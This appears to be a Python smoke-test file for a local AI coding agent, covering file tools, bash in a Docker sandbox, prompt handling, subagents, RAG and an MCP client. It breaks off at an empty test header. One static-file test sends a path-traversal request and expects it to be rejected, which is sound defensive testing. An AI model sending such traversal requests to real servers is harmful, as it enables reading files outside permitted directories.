#!/usr/bin/env python3
"""Smoke tests for agent tool loop."""
import json, sys, os, tempfile, time, shutil
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
from tools import execute_tool, backup, undo, verify_file, resolve, init_config, init_backup, validate_tool
from agent import WORK_DIR

init_config(WORK_DIR=WORK_DIR, OLLAMA_URL="http://localhost:11434", MODEL="test", NO_CONFIRM=True)
init_backup()

TMP = WORK_DIR / ".test_tmp"
TMP.mkdir(exist_ok=True)

def test_read():
    r = execute_tool("read", {"path": "agent.py"})
    assert "#!/usr/bin/env python3" in r, "read failed"
    print("  [OK] read")

def test_read_absolute():
    r = execute_tool("read", {"path": str(Path(WORK_DIR) / "agent.py")})
    assert "import json" in r, "read absolute failed"
    print("  [OK] read absolute path")

def test_read_url():
    r = execute_tool("read", {"path": "https://google.com"})
    assert "Google" in r, "read URL failed"
    print("  [OK] read URL")

def test_list():
    r = execute_tool("list", {"path": "."})
    assert "agent.py" in r, "list failed"
    print("  [OK] list")

def test_glob():
    r = execute_tool("glob", {"pattern": "*.py"})
    assert "agent.py" in r, "glob failed"
    print("  [OK] glob")

def test_write_and_undo():
    test_file = TMP / "test_write.txt"
    r = execute_tool("write", {"path": str(test_file), "content": "hello"})
    assert "Written" in r, "write failed"
    assert test_file.read_text() == "hello", "write content wrong"
    print("  [OK] write")

def test_edit():
    test_file = TMP / "test_edit.txt"
    test_file.write_text("old text")
    r = execute_tool("edit", {"path": str(test_file), "old": "old", "new": "new"})
    assert "Replaced" in r, "edit failed"
    assert test_file.read_text() == "new text", "edit content wrong"
    print("  [OK] edit")

def test_edit_guard_ambiguous():
    """old text found N times -> reject BEFORE mutating (AST-edit guard)."""
    f = TMP / "edit_guard_dup.py"
    f.write_text("x = 1\nprint(x)\nprint(x)\ny = 2\n")
    r = execute_tool("edit", {"path": str(f), "old": "print(x)", "new": "print('v', x)"})
    assert "found 2 times" in r and "NOT applied" in r, f"ambiguous edit not rejected: {r}"
    assert f.read_text() == "x = 1\nprint(x)\nprint(x)\ny = 2\n", "file mutated despite ambiguity"
    u = execute_tool("edit", {"path": str(f), "old": "print(x)\ny = 2", "new": "print('v', x)\ny = 3"})
    assert "Replaced" in u and "Syntax: OK" in u, f"unique edit failed: {u}"
    assert "print('v', x)" in f.read_text() and "print(x)" in f.read_text(), "wrong replace"
    print("  [OK] edit guard: ambiguous rejected, unique applied")

def test_edit_guard_fuzzy_hint():
    """typo'd old text -> 'Closest match' hint pointing at the real line."""
    f = TMP / "edit_guard_fuzzy.py"
    f.write_text("def compute_total():\n    return 42\n")
    r = execute_tool("edit", {"path": str(f), "old": "def comput_total():", "new": "def total():"})
    assert "text not found" in r, "typo edit not rejected"
    assert "Closest match" in r and "compute_total" in r, f"no fuzzy hint: {r}"
    assert f.read_text() == "def compute_total():\n    return 42\n", "file mutated on typo"
    print("  [OK] edit guard: fuzzy closest-match hint")

def test_compact_prompt_after_iterations():
    """Stage 23: after iteration 3 the full RULES block is swapped for the
    compact prompt (KV-cache prefix shrink); earlier calls keep the full one."""
    import agent as agent_mod
    calls = {"n": 0, "prompts": []}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        sys0 = next((m["content"] for m in msgs if m.get("role") == "system"), "")
        calls["prompts"].append(sys0)
        return ("Done.", 5)
    def mock_stream(msgs, model, on_chunk=None):
        calls["n"] += 1
        sys0 = next((m["content"] for m in msgs if m.get("role") == "system"), "")
        calls["prompts"].append(sys0)
        tools = [
            '```tool\n{"tool": "list", "path": "."}\n```',
            '```tool\n{"tool": "list", "path": "tools"}\n```',
            '```tool\n{"tool": "glob", "pattern": "*.py"}\n```',
            '```tool\n{"tool": "grep", "pattern": "def ", "include": "*.py"}\n```',
        ]
        text = tools[calls["n"] - 1] if calls["n"] <= len(tools) else "Done."
        if on_chunk:
            on_chunk(text)
        return text
    original = agent_mod.call_ollama
    original_stream = agent_mod.stream_ollama
    agent_mod.call_ollama = mock_ollama
    agent_mod.stream_ollama = mock_stream
    try:
        agent_mod.run_agent_loop(
            [{"role": "system", "content": agent_mod.SYSTEM_PROMPT},
             {"role": "user", "content": "list files"}], None, events=lambda e: None)
    finally:
        agent_mod.call_ollama = original
        agent_mod.stream_ollama = original_stream
    assert len(calls["prompts"]) >= 5, f"not enough model calls: {len(calls['prompts'])}"
    full_prompt = calls["prompts"][0]
    assert "COMPACT_SYSTEM_PROMPT" not in full_prompt and "RULES" in full_prompt
    compact_prompt = calls["prompts"][-1]
    assert "COMPACT" in compact_prompt and "RULES" in compact_prompt, \
        f"prompt not compacted on later iterations: {compact_prompt[:100]}"
    assert len(compact_prompt) < len(full_prompt) / 2, "compact prompt not smaller"
    print("  [OK] prompt KV-cache: full -> compact after iteration 3")

def test_syntax_guard_write():
    """write/edit/patch report AST syntax status (Python/JSON) so the model
    can self-correct broken code immediately."""
    good = TMP / "syntax_good.py"
    r = execute_tool("write", {"path": str(good), "content": "def f():\n    return 1\n"})
    assert "Syntax: OK" in r, f"good python not OK: {r}"
    bad = TMP / "syntax_bad.py"
    r = execute_tool("write", {"path": str(bad), "content": "def f(:\n"})
    assert "Syntax: ERROR" in r and "line 1" in r, f"broken python not caught: {r}"
    jbad = TMP / "syntax_bad.json"
    r = execute_tool("write", {"path": str(jbad), "content": "{not json"})
    assert "Syntax: ERROR" in r and "JSON" in r, f"broken json not caught: {r}"
    efile = TMP / "syntax_edit.py"
    efile.write_text("def f():\n    return 1\n")
    r = execute_tool("edit", {"path": str(efile), "old": "def f():", "new": "def f(:"})
    assert "Syntax: ERROR" in r, f"edit broken syntax not caught: {r}"
    print("  [OK] AST syntax guard on write/edit")

def test_patch_multi_file():
    """patch accepts files=[{path, diff}, ...] — several files in one call,
    applied in order, each backed up, verified and syntax-checked."""
    a = TMP / "multi_a.py"
    b = TMP / "multi_b.py"
    a.write_text("x = 1\n")
    b.write_text("y = 2\n")
    def _diff(fname, old, new):
        return f"--- a/{fname}\n+++ b/{fname}\n@@ -1 +1 @@\n-{old}\n+{new}\n"
    r = execute_tool("patch", {"files": [
        {"path": str(a), "diff": _diff("a", "x = 1", "x = 10")},
        {"path": str(b), "diff": _diff("b", "y = 2", "y = 20")},
    ]})
    assert "Patched" in r and r.count("Syntax: OK") == 2, f"multi patch failed: {r}"
    assert a.read_text() == "x = 10\n" and b.read_text() == "y = 20\n", r
    from tools import validate_tool
    r2v = validate_tool({"tool": "patch", "files": [{"path": "a", "diff": "garbage"}]})
    assert "no hunk headers" in r2v, f"files diff validation missing: {r2v}"
    r3v = validate_tool({"tool": "patch", "files": [{"path": "a"}]})
    assert "patch.files must be" in r3v, f"files shape validation missing: {r3v}"
    r3 = execute_tool("patch", {"files": [{"path": str(a),
        "diff": "--- a/a\n+++ b/a\n@@ -1 +1 @@\n nope\n+x\n"}]})
    assert "mismatch" in r3, f"mismatch not reported per-file: {r3}"
    print("  [OK] patch multi-file (files=[{path, diff}])")

def test_system_prompt_rules():
    """Regression guard: the system prompt must keep the hard-won rules —
    anti-hallucination (16), one-tool-per-reply + [DONE] finish (17-18),
    code-only-via-write (19) and the few-shot EXAMPLES section."""
    from tools import SYSTEM_PROMPT
    checks = [
        ("rule16 never invent paths", "NEVER invent file paths"),
        ("rule17 one tool per reply", "ONE tool block per reply"),
        ("rule18 [DONE] finish", "[DONE]"),
        ("rule19 no code in text", "code goes INTO files via `write`/`edit`"),
        ("rule24 rename all occurrences", "replace ALL occurrences"),
        ("tool block fence", "```tool"),
        ("never invent tools", "NEVER invent tools"),
        ("read before edit", "ALWAYS read a file with the `read` tool BEFORE calling `edit`"),
        ("confirm repeat rule", "you MUST repeat the exact same ```tool block"),
    ]
    for label, needle in checks:
        assert needle in SYSTEM_PROMPT, f"SYSTEM_PROMPT missing: {label} ({needle!r})"
    from tools import COMPACT_SYSTEM_PROMPT, SYSTEM_PROMPT_FEWSHOT
    from tools.llm import NATIVE_SYSTEM_PROMPT
    assert "task(agent='reviewer'" in SYSTEM_PROMPT, "rule 23 missing"
    assert "reviewer" in COMPACT_SYSTEM_PROMPT, "compact prompt missing subagent line"
    assert "reviewer" in NATIVE_SYSTEM_PROMPT, "native prompt missing subagent rule"
    fewshot_checks = [
        ("EXAMPLES section", "EXAMPLES — study these"),
        ("example 1 header", "Example 1 (read, then answer)"),
        ("example 2 header", "Example 2 (edit workflow — replace ALL occurrences when renaming)"),
        ("example 4 header", "Example 4 (create a new file"),
        ("example 5 header", "Example 5 (one tool at a time"),
        ("VALID section", "VALID tool block"),
        ("INVALID section", "INVALID (will be IGNORED"),
    ]
    for label, needle in fewshot_checks:
        assert needle in SYSTEM_PROMPT_FEWSHOT, f"FEWSHOT missing: {label} ({needle!r})"
    assert "EXAMPLES" not in SYSTEM_PROMPT, "EXAMPLES must live in the few-shot tier, not SYSTEM_PROMPT"
    print("  [OK] system prompt: rules 16-24 in SYSTEM, EXAMPLES/VALID/INVALID in FEWSHOT tier")

def test_prompt_fewshot_tier():
    """Stage 70: few-shot tier is injected on iterations 0-1 (legacy) and
    dropped afterwards; native models never see it."""
    import agent as agent_mod
    from core.agent_loop import _apply_fewshot_tier
    msgs = [{"role": "system", "content": agent_mod.SYSTEM_PROMPT},
            {"role": "user", "content": "create a file"}]
    state = _apply_fewshot_tier(msgs, 0, False, native_on=False)
    assert state is True
    assert any("EXAMPLES — study these" in m.get("content", "") for m in msgs), \
        "few-shot must be present on iteration 0"
    state = _apply_fewshot_tier(msgs, 1, state, native_on=False)
    assert state is True, "few-shot must stay on iteration 1"
    state = _apply_fewshot_tier(msgs, 2, state, native_on=False)
    assert state is False
    assert not any("EXAMPLES — study these" in m.get("content", "") for m in msgs), \
        "few-shot must be dropped by iteration 2"
    msgs2 = [{"role": "system", "content": agent_mod.SYSTEM_PROMPT}]
    state = _apply_fewshot_tier(msgs2, 0, False, native_on=True)
    assert state is False
    assert not any("EXAMPLES" in m.get("content", "") for m in msgs2), \
        "native sessions must never get the few-shot tier"
    print("  [OK] few-shot tier: legacy it0-1 yes, it2+ no, native never")

def test_dynamic_context():
    """Each model call gets a dynamic orientation block (project + last action
    + result status); first call has no last action yet."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(msgs)
        return '```tool\n{"tool": "list", "path": "."}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "list files"}], None)
    finally:
        agent_mod.call_ollama = original
    assert calls, "model never called"
    dyn = [m for m in calls[-1] if m.get("role") == "system"
           and "You are working in project" in m.get("content", "")]
    assert dyn, "dynamic context block missing in last call"
    assert "Last action: list (result: ok)" in dyn[-1]["content"], dyn[-1]["content"]
    print("  [OK] dynamic context injected into model calls")

def test_subagent_marker():
    """Stage 54: "@reviewer <task>" (and @fixer/@general) in the first user
    message swaps the system prompt for the subagent and strips the marker."""
    from agent import _apply_subagent_marker, SYSTEM_PROMPT
    from tools import SUBAGENT_PROMPTS
    def mk(text):
        return [{"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": text}]
    # reviewer
    task, msgs, agent = _apply_subagent_marker("@reviewer Check calc.py", mk("@reviewer Check calc.py"))
    assert task == "Check calc.py", task
    assert agent == "reviewer"
    assert msgs[-1]["content"] == "Check calc.py"
    assert msgs[0]["content"] == SUBAGENT_PROMPTS["reviewer"]
    # fixer with punctuation+newline
    task, msgs, agent = _apply_subagent_marker("@fixer :  Fix it\nline2",
        mk("@fixer :  Fix it\nline2"))
    assert task == "Fix it\nline2", repr(task)
    assert agent == "fixer"
    assert msgs[0]["content"] == SUBAGENT_PROMPTS["fixer"]
    # general
    task, msgs, agent = _apply_subagent_marker("@general Explore", mk("@general Explore"))
    assert task == "Explore" and agent == "general"
    assert msgs[0]["content"] == SUBAGENT_PROMPTS["general"]
    # no marker -> untouched, agent None
    task, msgs, agent = _apply_subagent_marker("review calc.py", mk("review calc.py"))
    assert task == "review calc.py"
    assert agent is None
    assert msgs[0]["content"] == SYSTEM_PROMPT
    # bare marker (no task text) -> empty task, prompt still swapped
    task, msgs, agent = _apply_subagent_marker("@reviewer", mk("@reviewer"))
    assert task == "" and agent == "reviewer"
    assert msgs[0]["content"] == SUBAGENT_PROMPTS["reviewer"]
    print("  [OK] @reviewer/@fixer/@general markers")

def test_subagent_prompts_defined():
    """Stage 45: all three subagent prompts must exist and be non-empty."""
    from tools import SUBAGENT_PROMPTS
    for k in ("reviewer", "fixer", "general"):
        assert k in SUBAGENT_PROMPTS, f"missing {k}"
        assert len(SUBAGENT_PROMPTS[k]) > 200, f"{k} prompt too short"
    print("  [OK] SUBAGENT_PROMPTS reviewer/fixer/general defined")

def test_dynamic_context_error_status():
    """Failed tool result must be reported as 'error' in the next call."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(msgs)
        return '```tool\n{"tool": "read", "path": "missing_xyz.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "read missing file"}], None)
    finally:
        agent_mod.call_ollama = original
    assert len(calls) >= 2, f"expected >=2 calls, got {len(calls)}"
    dyn = [m for m in calls[-1] if m.get("role") == "system"
           and "Last action" in m.get("content", "")]
    assert dyn and "result: error" in dyn[-1]["content"], f"error status missing: {dyn}"
    print("  [OK] dynamic context reports error status")

def test_dynamic_context_global_stats():
    """Global (all-session) TOOL_STATS with repeated failures appear in the
    dynamic context so the model can self-correct argument patterns."""
    from core.agent_loop import _dynamic_context
    stats = {"read": {"calls": 20, "errors": 7},
             "edit": {"calls": 5, "errors": 1},
             "bash": {"calls": 2, "errors": 2},
             "write": {"calls": 1, "errors": 1}}
    c = _dynamic_context("read", "Error: no such file", 2, sess_stats=None,
                         project="proj", tool_stats=stats)
    assert "Global tool stats (all sessions):" in c, c
    assert "read: 7 error(s) of 20 call(s)" in c, c
    assert "write:" not in c, f"single-failure tool must be excluded: {c}"
    assert "bash: 2 error(s) of 2 call(s)" in c, c
    c2 = _dynamic_context("list", "ok", 0, tool_stats={})
    assert "Global tool stats" not in c2, c2
    print("  [OK] global tool stats in dynamic context (repeated failures only)")

def test_tool_error_fewshot():
    """After a tool error + prose reply, the nudge must include a concrete
    fix example (tried -> error -> corrected tool), not just 'fix the JSON'."""
    import agent as agent_mod
    def mock_ollama(msgs, model):
        if msgs[-1].get("role") == "system" and "Example of fixing a tool error" in msgs[-1]["content"]:
            return '```tool\n{"tool": "glob", "pattern": "**/*.py"}\n```', 10
        return 'I will check the file. Actually let me help you.\n```tool\n{"tool": "read", "path": "bad_path.py"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop([{"role": "user", "content": "check bad_path.py"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "Example of fixing a tool error" in out or "glob" in out, \
        f"few-shot fix example not applied: {out[:300]}"
    print("  [OK] tool-error nudge includes fix example")

def test_bash():
    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")


    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")


    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")

def test_parse_tool_json_lenient():
    """Lenient tool-JSON parsing: single quotes, unquoted keys, trailing
    comma/garbage after the block must all still yield a valid tool dict."""
    import agent as agent_mod
    cases = [
        ('{"tool": "list", "path": "."}', {"tool": "list", "path": "."}),
        ("{'tool': 'list', 'path': '.'}", {"tool": "list", "path": "."}),
        ('{tool: "write", path: "x.py"}', {"tool": "write", "path": "x.py"}),
        ('{"tool": "read", "path": "x"} trailing prose', {"tool": "read", "path": "x"}),
        ('{"tool": "bash", "cmd": "ls",}', {"tool": "bash", "cmd": "ls"}),
    ]
    for raw, want in cases:
        got = agent_mod._parse_tool_json(raw)
        assert got == want, f"{raw!r} -> {got} != {want}"
    try:
        agent_mod._parse_tool_json("total garbage")
        assert False, "garbage must raise"
    except json.JSONDecodeError:
        pass
    print("  [OK] lenient tool-JSON parsing (quotes/keys/comma/garbage)")

def test_tool_stats():
    """TOOL_STATS tracks calls and errors per tool; /api/stats returns them."""
    import tools as tools_mod
    before = tools_mod.TOOL_STATS.get("bash", {}).get("calls", 0)
    r = tools_mod.execute_tool("bash", {"cmd": "echo stats_probe"})
    assert "stats_probe" in r, "probe failed"
    cur = tools_mod.TOOL_STATS["bash"]
    assert cur["calls"] == before + 1, f"calls not counted: {cur}"
    assert cur["errors"] == 0, f"echo should not count as error: {cur}"
    r = tools_mod.execute_tool("read", {"path": "definitely_missing_12345.txt"})
    assert r.startswith("Error:"), "missing file should error"
    assert tools_mod.TOOL_STATS["read"]["errors"] >= 1, "errors not counted"
    print("  [OK] tool stats: calls/errors tracked")



def test_bash_docker_mode():
    """With BASH_DOCKER=1 and docker present, bash runs inside a container
    mounting WORK_DIR at /workspace; whitelist still applies."""
    import tools as tools_mod
    called = {"dcmd": None, "shell": 0}
    def fake_run(dcmd, **kw):
        if isinstance(dcmd, list) and dcmd and dcmd[0] == "docker":
            called["dcmd"] = dcmd
            return type("R", (), {"stdout": "hi from docker\n", "stderr": "", "returncode": 0})()
        called["shell"] += 1
        return type("R", (), {"stdout": "hi from local\n", "stderr": "", "returncode": 0})()
    old_env = os.environ.get("BASH_DOCKER")
    old_which = tools_mod.shutil.which
    old_run = tools_mod.subprocess.run
    os.environ["BASH_DOCKER"] = "1"
    tools_mod.shutil.which = lambda name: "docker" if name == "docker" else None
    tools_mod.subprocess.run = fake_run
    try:
        r = execute_tool("bash", {"cmd": "echo hi"})
    finally:
        if old_env is None: os.environ.pop("BASH_DOCKER", None)
        else: os.environ["BASH_DOCKER"] = old_env
        tools_mod.shutil.which = old_which
        tools_mod.subprocess.run = old_run
    assert "hi from docker" in r, f"docker output missing: {r[:200]}"
    assert called["dcmd"] and "-v" in called["dcmd"] and "/workspace" in called["dcmd"], f"bad docker cmd: {called['dcmd']}"
    print("  [OK] bash: docker sandbox mode")

def test_bash_docker_flags():
    """BASH_DOCKER_READONLY / _MEM / _USER must add :ro mount, --memory, --user."""
    import tools as tools_mod
    called = {"dcmd": None}
    def fake_run(dcmd, **kw):
        if isinstance(dcmd, list) and dcmd and dcmd[0] == "docker":
            called["dcmd"] = dcmd
            return type("R", (), {"stdout": "ok\n", "stderr": "", "returncode": 0})()
        raise AssertionError("should not reach local shell")
    old = {k: os.environ.get(k) for k in ("BASH_DOCKER", "BASH_DOCKER_READONLY", "BASH_DOCKER_MEM", "BASH_DOCKER_SWAP", "BASH_DOCKER_USER")}
    old_which = tools_mod.shutil.which
    old_run = tools_mod.subprocess.run
    os.environ["BASH_DOCKER"] = "1"
    os.environ["BASH_DOCKER_READONLY"] = "1"
    os.environ["BASH_DOCKER_MEM"] = "512m"
    os.environ["BASH_DOCKER_SWAP"] = "1g"
    os.environ["BASH_DOCKER_USER"] = "1000:1000"
    tools_mod.shutil.which = lambda name: "docker" if name == "docker" else None
    tools_mod.subprocess.run = fake_run
    try:
        r = execute_tool("bash", {"cmd": "echo hi"})
    finally:
        for k, v in old.items():
            if v is None: os.environ.pop(k, None)
            else: os.environ[k] = v
        tools_mod.shutil.which = old_which
        tools_mod.subprocess.run = old_run
    dcmd = called["dcmd"]
    assert dcmd, "docker never called"
    assert any(":/workspace:ro" in a for a in dcmd), f":ro mount missing: {dcmd}"
    assert "--memory" in dcmd and "512m" in dcmd, f"--memory missing: {dcmd}"
    assert "--memory-swap" in dcmd and "1g" in dcmd, f"--memory-swap missing: {dcmd}"
    assert "--user" in dcmd and "1000:1000" in dcmd, f"--user missing: {dcmd}"
    print("  [OK] bash: docker readonly/memory/user flags")

def test_bash_docker_fallback():
    """If docker is configured but unavailable, fall back to the local shell."""
    import tools as tools_mod
    called = {"shell": 0}
    def fake_run(dcmd, **kw):
        if isinstance(dcmd, list) and dcmd and dcmd[0] == "docker":
            raise RuntimeError("no docker daemon")
        called["shell"] += 1
        return type("R", (), {"stdout": "local ok\n", "stderr": "", "returncode": 0})()
    old_env = os.environ.get("BASH_DOCKER")
    old_which = tools_mod.shutil.which
    old_run = tools_mod.subprocess.run
    os.environ["BASH_DOCKER"] = "1"
    tools_mod.shutil.which = lambda name: "docker" if name == "docker" else None
    tools_mod.subprocess.run = fake_run
    try:
        r = execute_tool("bash", {"cmd": "echo hi"})
    finally:
        if old_env is None: os.environ.pop("BASH_DOCKER", None)
        else: os.environ["BASH_DOCKER"] = old_env
        tools_mod.shutil.which = old_which
        tools_mod.subprocess.run = old_run
    assert "local ok" in r, f"fallback failed: {r[:200]}"
    assert called["shell"] == 1, f"expected 1 local shell call, got {called['shell']}"
    print("  [OK] bash: docker fallback to local shell")

def test_health_endpoint():
    """GET /health returns status/model/sessions/rag_chunks without crashing."""
    import api_misc
    h = api_misc.health()
    assert h["status"] == "ok", h
    assert h["model"] and h["workspace"], h
    assert isinstance(h["rag_chunks"], int), h
    assert h["uptime_s"] >= 0, h
    print("  [OK] /health endpoint payload")

def test_subagents_api():
    """Stage 61: GET /api/subagents lists marker name/desc for every subagent."""
    import api_misc
    subs = {s["name"]: s for s in api_misc.list_subagents()}
    for n in ("reviewer", "fixer", "general", "explore", "scout"):
        assert n in subs, f"missing {n}"
        assert subs[n]["marker"] == "@" + n
        assert subs[n]["desc"], f"{n} desc empty"
        assert subs[n]["tools"], f"{n} tools hint empty"
    from tools import SUBAGENT_PROMPTS
    assert len(subs) == len(SUBAGENT_PROMPTS)
    print("  [OK] /api/subagents catalogue")

def test_vendor_static():
    """Vendored frontend libs served locally (offline UI, no CDN needed)."""
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    for path, ctype in [("/static/vendor/xterm.min.js", "javascript"),
                        ("/static/vendor/xterm.css", "css"),
                        ("/static/vendor/cm6.bundle.js", "javascript"),
                        ("/static/vendor/cm/codemirror.min.js", "javascript"),
                        ("/static/vendor/cm/mode/python/python.min.js", "javascript")]:
        r = client.get(path)
        assert r.status_code == 200, f"{path} -> {r.status_code}"
        assert ctype in r.headers.get("content-type", ""), f"{path} ctype"
    r = client.get("/static/vendor/../../agent.py")
    assert r.status_code == 404, "path traversal must 404"
    r = client.get("/static/vendor/evil.txt")
    assert r.status_code == 404, "whitelist must reject unknown files"
    print("  [OK] vendored static (xterm + codemirror, offline)")

def test_json_schema_format():
    """Ollama format:TOOL_JSON_SCHEMA is sent when JSON mode is on (env or
    thread-local), and absent by default."""
    import tools
    import unittest.mock as um
    captured = {}
    def fake_post(url, json=None, **kw):
        captured["payload"] = json
        class R:
            def raise_for_status(self): pass
            def json(self):
                return {"message": {"content": '{"tool": "read", "path": "x.py"}'},
                        "eval_count": 3}
        return R()
    old_env = os.environ.pop("AI_JSON_FORMAT", None)
    tools.set_json_mode(False)
    try:
        with um.patch("tools.requests.post", side_effect=fake_post):
            tools.call_ollama([{"role": "user", "content": "msg default"}])
        assert "format" not in captured["payload"], "format must be off by default"
        tools.set_json_mode(True)
        with um.patch("tools.requests.post", side_effect=fake_post):
            msg, toks = tools.call_ollama([{"role": "user", "content": "msg threadlocal"}])
        assert captured["payload"]["format"] == tools.TOOL_JSON_SCHEMA, "thread-local mode must set format"
        tools.set_json_mode(False)
        os.environ["AI_JSON_FORMAT"] = "1"
        with um.patch("tools.requests.post", side_effect=fake_post):
            tools.call_ollama([{"role": "user", "content": "msg envmode"}])
        assert captured["payload"]["format"] == tools.TOOL_JSON_SCHEMA, "env mode must set format"
    finally:
        tools.set_json_mode(False)
        if old_env is None:
            os.environ.pop("AI_JSON_FORMAT", None)
        else:
            os.environ["AI_JSON_FORMAT"] = old_env
    print("  [OK] JSON Schema format (env + thread-local, off by default)")

def test_git_snapshot_restore():
    """git_prebackup captures the tree; git_restore_all returns tracked + untracked
    files to the snapshot state (new untracked files are removed)."""
    import tools
    import shutil
    import subprocess as sp
    old_wd = tools.WORK_DIR
    repo = TMP / "git_repo"
    if repo.exists():
        def _onerror(func, path, exc_info):
            os.chmod(path, 0o777)
            try:
                func(path)
            except OSError:
                pass
        shutil.rmtree(repo, onexc=_onerror if sys.version_info >= (3, 12) else _onerror)
    repo.mkdir(parents=True)
    (repo / "tracked.txt").write_text("base")
    sp.run(["git", "init", "-q", str(repo)], check=True)
    sp.run(["git", "-C", str(repo), "config", "user.name", "test"], check=True)
    sp.run(["git", "-C", str(repo), "config", "user.email", "test@test"], check=True)
    sp.run(["git", "-C", str(repo), "add", "-A"], check=True)
    sp.run(["git", "-C", str(repo), "commit", "-qm", "base"], check=True)
    tools.init_config(WORK_DIR=repo)
    tools.init_backup()
    try:
        victim = repo / "untracked_file.txt"
        victim.write_text("temp")
        sid = tools.git_prebackup()
        assert "snapshot" in sid, f"snapshot failed: {sid}"
        sid_id = sid.split()[2].rstrip(":")
        victim.unlink()
        (repo / "new_after.txt").write_text("new")
        (repo / "tracked.txt").write_text("modified")
        r = tools.git_restore_all(sid_id)
        assert "Restored" in r, f"restore failed: {r}"
        assert victim.exists(), "untracked from snapshot should be restored"
        assert not (repo / "new_after.txt").exists(), "file created after snapshot should be removed"
        assert (repo / "tracked.txt").read_text() == "base", "tracked changes should be reverted"
    finally:
        tools.init_config(WORK_DIR=old_wd)
        tools.init_backup()
    print("  [OK] git pre-backup + restore all")

def test_diff_preview():
    """diff_preview renders +/- lines; the executor emits a 'diff' event before edit."""
    from tools import diff_preview
    d = diff_preview("a.py", "old line", "new line")
    assert "-old line" in d and "+new line" in d, f"diff missing: {d}"
    from core.tool_executor import execute_tool_block
    evs = []
    ctx = {"msgs": [], "content": "", "full": [""], "emit": evs.append,
           "no_confirm": True, "session_id": None, "sess_stats": {},
           "pending_set": lambda *a, **k: None,
           "state": {"last_call_key": None, "repeats": 0,
                     "last_result_name": None, "last_result_text": ""}}
    execute_tool_block(0, {"tool": "edit", "path": "definitely_missing_edit_123.py",
                           "old": "a", "new": "b"}, ctx)
    assert any(e.get("type") == "diff" for e in evs), f"no diff event: {evs}"
    print("  [OK] inline diff preview")

def test_update_check():
    """GET /api/update returns current HEAD and knows when behind origin."""
    import api_misc
    data = api_misc.update_check()
    assert isinstance(data, dict) and data.get("ok") in (True, False), data
    if data.get("ok"):
        assert data["current"] and len(data["current"]) >= 7, data
        assert isinstance(data["behind"], int), data
    print("  [OK] update check")

def test_rag_folder_scope():
    """RAG folder segmentation: scope= filters chunks to one top-level folder."""
    import rag
    import unittest.mock as um
    rag.RAG_INDEX = None
    rag.RAG_CHUNKS = []
    rag.RAG_DIRTY = True
    rag.RAG_CACHE_DIR = None
    rag.FAISS_INDEX = None
    rag.init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=WORK_DIR, EMBED_MODEL="nomic-embed-text")
    rag.RAG_CHUNKS = [
        {"text": "core router handling", "file": "core/router.py", "line": 1, "emb": [1.0, 0.0], "_toks": []},
        {"text": "tools shell guard", "file": "tools/guard.py", "line": 1, "emb": [0.0, 1.0], "_toks": []},
        {"text": "standalone script", "file": "main.py", "line": 1, "emb": [0.5, 0.5], "_toks": []},
    ]
    rag.RAG_INDEX = [c["emb"] for c in rag.RAG_CHUNKS]
    rag._rebuild_fast_index()
    def fake_embed(*a, **k):
        class R:
            def json(self):
                return {"embeddings": [[1.0, 0.0]]}
        return R()
    with um.patch("rag.requests.post", side_effect=fake_embed):
        scoped = rag.rag_search("router", top_k=5, scope="core")
        assert "core/router.py" in scoped, scoped
        assert "tools/guard.py" not in scoped, f"scope leaked: {scoped}"
        assert "main.py" not in scoped, f"scope leaked: {scoped}"
        empty = rag.rag_search("router", top_k=5, scope="nope")
        assert "No RAG chunks" in empty, empty
    print("  [OK] RAG folder scope")

def test_mcp_client():
    """MCP stdio handshake: initialize -> initialized -> tools/list -> tools/call."""
    import mcp_client
    import json as _json
    mock_script = TMP / "mock_mcp_server.py"
    mock_script.write_text(
        "import json, sys\n"
        "for line in sys.stdin:\n"
        "    line = line.strip()\n"
        "    if not line: continue\n"
        "    msg = json.loads(line)\n"
        "    if msg.get('method') == 'initialize':\n"
        "        sys.stdout.write(json.dumps({'jsonrpc':'2.0','id':msg['id'],"
        "'result':{'protocolVersion':'2024-11-05','capabilities':{'tools':{}}}})+'\\n'); sys.stdout.flush()\n"
        "    elif msg.get('method') == 'tools/list':\n"
        "        sys.stdout.write(json.dumps({'jsonrpc':'2.0','id':msg['id'],"
        "'result':{'tools':[{'name':'add','description':'a+b',"
        "'inputSchema':{'type':'object','properties':{'a':{'type':'number'},'b':{'type':'number'}}}}]}})+'\\n'); sys.stdout.flush()\n"
        "    elif msg.get('method') == 'tools/call':\n"
        "        a=msg['params'].get('arguments',{}); s=str(a.get('a',0)+a.get('b',0))\n"
        "        sys.stdout.write(json.dumps({'jsonrpc':'2.0','id':msg['id'],"
        "'result':{'content':[{'type':'text','text':'sum='+s}]}})+'\\n'); sys.stdout.flush()\n"
    )
    old_cfg = mcp_client.CONFIG_PATH
    cfg = TMP / "mcp_servers.json"
    cfg.write_text(_json.dumps({"servers": [
        {"name": "mock", "command": sys.executable, "args": [str(mock_script)]}]}))
    mcp_client.CONFIG_PATH = cfg
    try:
        clients = mcp_client.get_clients()
        assert "mock" in clients, clients
        tools = mcp_client.mcp_tools_list()
        assert ("mock", "add") in tools, tools
        r = mcp_client.mcp_call("mock", "add", {"a": 2, "b": 3})
        assert "sum=5" in r, f"call result: {r}"
        mcp_client.mcp_call("mock", "stop", {})
    finally:
        mcp_client.CONFIG_PATH = old_cfg
        for c in list(mcp_client._procs.values()):
            c.stop()
        mcp_client._procs.clear()
    print("  [OK] MCP client (initialize/tools/call)")

def test_mcp_integration():
